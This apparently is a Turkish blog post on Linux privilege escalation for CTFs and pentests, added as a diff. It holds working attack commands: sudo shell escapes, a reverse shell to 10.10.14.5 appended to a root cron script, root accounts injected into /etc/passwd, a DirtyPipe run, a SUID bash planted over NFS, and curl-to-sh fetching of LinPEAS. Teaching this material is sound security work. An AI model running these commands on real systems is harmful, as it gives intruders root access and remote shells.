@@ -1,0 +1,175 @@
+---
+title: "Linux Privilege Escalation: Root'a Giden Yollar"
+date: "2026-03-13"
+description: "CTF ve gerçek dünya senaryolarında Linux'ta yetki yükseltmenin en yaygın vektörlerini, enumeration araçlarını ve sömürü tekniklerini ele aldım."
+tags: ["Linux", "Pentest", "CTF"]
+---
+
+## Neden Privesc?
+
+Bir sisteme erişim sağladığınızda genellikle düşük yetkili bir kullanıcı olarak başlarsınız. **Privilege escalation** (privesc), bu erişimi `root` veya `SYSTEM` seviyesine yükseltme sürecidir. CTF'lerde final flag, gerçek pentestlerde ise tam sistem kontrolü burada gizlidir.
+
+> Enumeration her şeydir. Çoğu zaman açık gözünüzün önündedir.
+
+## Enumeration — Neye Bakmalı?
+
+### Sistem Bilgisi
+
+```bash
+# İşletim sistemi ve kernel versiyonu
+uname -a
+cat /etc/os-release
+cat /proc/version
+
+# Çalışan servisler
+ps aux
+ss -tnlp
+
+# Zamanlanmış görevler
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+```
+
+### Kullanıcı ve Grup
+
+```bash
+# Mevcut kullanıcı
+id
+whoami
+
+# Sudo yetkisi var mı?
+sudo -l
+
+# Tüm kullanıcılar
+cat /etc/passwd | grep -v nologin
+
+# Grup üyelikleri
+groups
+cat /etc/group
+```
+
+### SUID / GUID Bitleri
+
+```bash
+# SUID binary'leri bul
+find / -perm -4000 -type f 2>/dev/null
+
+# GUID binary'leri bul
+find / -perm -2000 -type f 2>/dev/null
+```
+
+## Otomatik Enumeration
+
+Manuel kontrolleri tamamladıktan sonra otomatik araçları çalıştırın:
+
+```bash
+# LinPEAS — en kapsamlı araç
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# LinEnum
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh && ./LinEnum.sh
+
+# linux-smart-enumeration
+wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
+chmod +x lse.sh && ./lse.sh -l 1
+```
+
+## Yaygın Vektörler
+
+### 1. Sudo Hakkı Sömürme
+
+```bash
+# sudo -l çıktısında tehlikeli komutlar
+sudo find /tmp -exec /bin/bash \;
+sudo vim -c ':!/bin/bash'
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo python3 -c 'import os; os.system("/bin/bash")'
+```
+
+GTFOBins (`gtfobins.github.io`) her binary için sömürü yöntemini listeler.
+
+### 2. Yazılabilir Cron Job
+
+```bash
+# /etc/crontab içinde root çalıştıran ama yazılabilir script
+* * * * * root /opt/backup.sh
+
+# Eğer backup.sh yazılabilirse:
+echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /opt/backup.sh
+```
+
+### 3. SUID Binary — GTFOBins
+
+```bash
+# Örnek: /usr/bin/find SUID ise
+find . -exec /bin/sh -p \; -quit
+
+# Örnek: /usr/bin/cp SUID ise — /etc/passwd üzerine yaz
+cp /etc/passwd /tmp/passwd.bak
+echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd
+su hacker
+```
+
+### 4. Kernel Exploit
+
+```bash
+# Kernel versiyonunu öğren
+uname -r
+# Örnek çıktı: 5.4.0-42-generic
+
+# searchsploit ile exploit ara
+searchsploit linux kernel 5.4 privilege escalation
+
+# Popüler: DirtyPipe (CVE-2022-0847) — kernel 5.8–5.16
+gcc dirtypipe.c -o dirtypipe
+./dirtypipe /etc/passwd 1 ootz::0:0:root:/root:/bin/bash
+su ootz
+```
+
+### 5. NFS No_root_squash
+
+```bash
+# Hedef makinede
+cat /etc/exports
+# Örnek: /shared *(rw,no_root_squash)
+
+# Saldırgan makinede (root olarak)
+mount -t nfs 10.10.10.1:/shared /mnt/nfs
+cp /bin/bash /mnt/nfs/rootbash
+chmod +s /mnt/nfs/rootbash
+
+# Hedef makinede
+/tmp/rootbash -p   # root shell!
+```
+
+### 6. Yazılabilir /etc/passwd
+
+```bash
+# /etc/passwd yazılabilir mi?
+ls -la /etc/passwd
+
+# Parola hash'i oluştur
+openssl passwd -1 -salt hax s3cr3t
+# Çıktı: $1$hax$Yos...
+
+# Satırı ekle
+echo 'hax:$1$hax$Yos...:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hax  # parola: s3cr3t
+```
+
+## Hızlı Referans Tablosu
+
+| Vektör | Kontrol Komutu | Kaynak |
+|---|---|---|
+| Sudo | `sudo -l` | GTFOBins |
+| SUID | `find / -perm -4000` | GTFOBins |
+| Cron | `cat /etc/crontab` | Manuel analiz |
+| Kernel | `uname -r` | searchsploit |
+| NFS | `cat /etc/exports` | Manuel |
+| Yazılabilir passwd | `ls -la /etc/passwd` | Manuel |
+
+## Sonraki Adım
+
+Root olduktan sonra kalıcılık (persistence) sağlamak, pivot yapmak ve izleri temizlemek ayrı bir yazı konusu. Bir sonraki yazıda **post-exploitation** tekniklerini ele alacağım.
